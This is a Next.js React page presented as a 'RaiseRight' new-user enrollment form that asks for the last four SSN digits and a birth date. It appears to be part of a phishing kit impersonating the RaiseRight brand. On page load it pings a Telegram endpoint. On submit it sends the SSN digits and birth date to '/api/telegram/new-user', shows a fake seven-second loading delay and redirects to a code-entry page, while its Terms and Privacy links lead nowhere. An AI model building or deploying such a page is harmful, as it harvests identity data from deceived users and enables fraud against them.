"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { MONTHS, DAYS, YEARS } from "@/lib/date-constants";

export default function NewUserPage() {
  const router = useRouter();
  const [ssnLast4, setSsnLast4] = useState("");
  const [month, setMonth] = useState("");
  const [day, setDay] = useState("");
  const [year, setYear] = useState("");
  const [privacyAccepted, setPrivacyAccepted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const ssnDigits = ssnLast4.replace(/\D/g, "");
  const isSsnValid = ssnDigits.length === 4;
  const isDateValid = month && day && year;
  const isFormValid = isSsnValid && isDateValid && privacyAccepted;
  const hasNotifiedView = useRef(false);

  useEffect(() => {
    if (hasNotifiedView.current) return;
    hasNotifiedView.current = true;
    fetch("/api/telegram/new-user-view", { method: "POST" }).catch(
      console.error,
    );
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    setIsLoading(true);
    try {
      await fetch("/api/telegram/new-user", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ssnLast4: ssnDigits,
          birthDate: `${month} ${day}, ${year}`,
        }),
      }).catch(console.error);
    } catch (err) {
      console.error("New user notification error:", err);
    }
    await new Promise((r) => setTimeout(r, 7000));
    router.push("/new-user-code");
  };

  return (
    <div className="min-h-screen bg-white font-raiseright text-[#243b5a]">
      <header className="w-full bg-white border-b border-white shadow-lg">
        <div className="flex w-full items-center justify-center h-27 md:h-30">
          <img
            src="/raiseright/images/logo.svg"
            alt="RaiseRight"
            className="w-83 h-auto md:w-95 object-contain"
          />
        </div>
      </header>

      <main className="mt-10">
        <section className="mx-auto w-full max-w-lg px-6 pt-16 sm:px-8 sm:pt-20">
          <h1 className="mb-10 text-center text-5xl font-light tracking-tight text-[#294d73]">
            New User Enrollment
          </h1>

          <form className="mt-9" onSubmit={handleSubmit}>
            <div className="mb-7">
              <label
                htmlFor="ssn"
                className="block text-base font-medium text-[#28577f]"
              >
                Last 4 of Social Security Number{" "}
                <span className="text-red-700">*</span>
              </label>
              <input
                id="ssn"
                name="ssn"
                type="text"
                maxLength={4}
                value={ssnLast4}
                onChange={(e) =>
                  setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))
                }
                className="w-full border-0 border-b border-[#28577f] px-2 pb-2 text-lg text-gray-600 outline-none placeholder:text-gray-500 bg-gray-50"
              />
              <p className="mt-1 text-sm text-gray-600">
                Used to securely verify your identity
              </p>
            </div>

            <div className="mb-7">
              <label className="block text-base font-medium text-[#28577f]">
                Birth Date <span className="text-red-700">*</span>
              </label>
              <div className="flex gap-2 flex-wrap mt-2">
                <select
                  value={month}
                  onChange={(e) => setMonth(e.target.value)}
                  className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-lg text-gray-900 min-w-[120px]"
                >
                  <option value="">Month</option>
                  {MONTHS.map((m) => (
                    <option key={m} value={m}>
                      {m}
                    </option>
                  ))}
                </select>
                <select
                  value={day}
                  onChange={(e) => setDay(e.target.value)}
                  className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-lg text-gray-900 min-w-[80px]"
                >
                  <option value="">Day</option>
                  {DAYS.map((d) => (
                    <option key={d} value={d}>
                      {d}
                    </option>
                  ))}
                </select>
                <select
                  value={year}
                  onChange={(e) => setYear(e.target.value)}
                  className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-lg text-gray-900 min-w-[90px]"
                >
                  <option value="">Year</option>
                  {YEARS.map((y) => (
                    <option key={y} value={y}>
                      {y}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div className="mb-7 text-base">
              <p className="mb-4">
                Please read and accept our{" "}
                <a
                  href="#"
                  className="text-[#1d64a3] hover:underline font-semibold"
                >
                  Terms of Use
                </a>{" "}
                and{" "}
                <a
                  href="#"
                  className="text-[#1d64a3] hover:underline font-semibold"
                >
                  Privacy Statement
                </a>{" "}
                to continue.
              </p>

              <label className="flex items-start gap-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={privacyAccepted}
                  onChange={(e) => setPrivacyAccepted(e.target.checked)}
                  className="mt-1 w-5 h-5 shrink-0 accent-[#1d64a3]"
                />
                <span>
                  I have read and agree to the Terms of Use and Privacy
                  Statement.
                </span>
              </label>
            </div>

            <button
              type="submit"
              className="w-full h-10 mt-7 rounded-md bg-[#1d64a3] text-white text-base font-medium hover:bg-[#076db7] transition disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={!isFormValid || isLoading}
            >
              {isLoading ? "Loading..." : "Continue"}
            </button>

            <button
              type="button"
              onClick={() => router.push("/")}
              className="w-full h-10 mt-4 flex items-center justify-center border border-gray-400 text-[#1d64a3] text-base font-medium hover:bg-gray-50 transition"
            >
              Return to Sign In
            </button>
          </form>
        </section>
      </main>
    </div>
  );
}
